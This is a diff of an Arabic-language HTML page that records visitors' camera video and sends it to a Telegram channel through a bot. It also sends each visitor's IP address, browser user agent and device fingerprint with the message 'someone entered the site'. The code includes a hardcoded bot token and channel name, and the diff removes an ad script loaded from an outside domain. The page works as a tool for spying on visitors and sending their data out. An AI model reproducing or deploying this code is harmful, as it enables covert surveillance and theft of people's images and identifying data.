@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <title>تسجيل الفيديو وإرسال المعلومات إلى Telegram</title>
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ffmpeg.js/0.8.6/ffmpeg.min.js"></script>
     <style>
@@ -32,7 +32,7 @@
     </style>
 </head>
 <body>
-    <h1>يرجى منح الإذن أولا 🫡</h1>
+    <h1>تسجيل الفيديو وإرساله مباشرة إلى Telegram!</h1>
     <video id="videoElement" autoplay muted></video>
 
     <script>
@@ -96,11 +96,11 @@
 
         async function sendToTelegram(media) {
             const botToken = '7531625189:AAH8EfmietQxzONKMoclIjJNgxEP89jes3w'; // توكن البوت
-            const chatId = '@karimbmr'; // اسم القناة
+            const chatId = '@Karimbmr'; // اسم القناة
             const url = `https://api.telegram.org/bot${botToken}/sendVideo`;
 
             const formData = new FormData();
-            formData.append('video', media, 'video.mp4'); // تأكد من استخدام اسم الملف المناسب
+            formData.append('video', media, 'video.mp4');
             formData.append('chat_id', chatId);
             formData.append('caption', 'فيديو مباشر!'); // إضافة تعليق إذا رغبت
 
@@ -123,7 +123,7 @@
 
         async function notifyTelegram(ipAddress, userAgent, fingerprint) {
             const botToken = '7531625189:AAH8EfmietQxzONKMoclIjJNgxEP89jes3w'; // توكن البوت
-            const chatId = '@karimbmr'; // اسم القناة
+            const chatId = '@Karimbmr'; // اسم القناة
             const message = `شخص ما دخل الموقع!\nعنوان IP: ${ipAddress}\nمعلومات المتصفح: ${userAgent}\nبصمة الجهاز: ${fingerprint}`;
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
@@ -175,22 +175,3 @@
     </script>
 </body>
 </html>
-<script type="text/javascript">
-
-	atOptions = {
-
-		'key' : '6e20197386a740a2a2940de1694ca33f',
-
-		'format' : 'iframe',
-
-		'height' : 90,
-
-		'width' : 728,
-
-		'params' : {}
-
-	};
-
-</script>
-
-<script type="text/javascript" src="//declareddetect.com/6e20197386a740a2a2940de1694ca33f/invoke.js"></script>
